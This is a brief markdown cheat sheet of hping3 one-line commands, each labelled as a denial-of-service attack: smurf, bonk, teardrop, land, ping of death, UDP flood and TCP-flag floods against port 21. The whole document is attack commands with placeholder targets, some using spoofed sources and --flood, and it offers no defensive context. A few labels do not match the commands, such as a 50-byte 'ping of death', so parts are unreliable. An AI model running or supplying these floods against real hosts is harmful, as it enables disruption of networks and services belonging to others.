# hping3
## ICMP Smurf Attack
```
hping3 -1 -a ip brodcast-ip --flood
```

## Bonk Attack
```
hping3 ip -Q
```

## Teardrop Attack
```
hping3 -1 ip -g 185
```

## Land Attack
```
hping3 -1 -a ip ip --flood
```

## Ping of death Attack
```
hping3 -1 --rand-source ip -d 50 --flood 
```

## UDP Flooding Attack
```
hping3 -2 ip -p 53 --flood
```

## Out of band Flooding Attack
```
hping3 -A ip -p 21 --flood
hping3 -P ip -p 21 --flood
hping3 -R ip -p 21 --flood
hping3 -U ip -p 21 --flood
hping3 -F ip -p 21 --flood
hping3 -SAPRUF ip -p 21 --flood
```
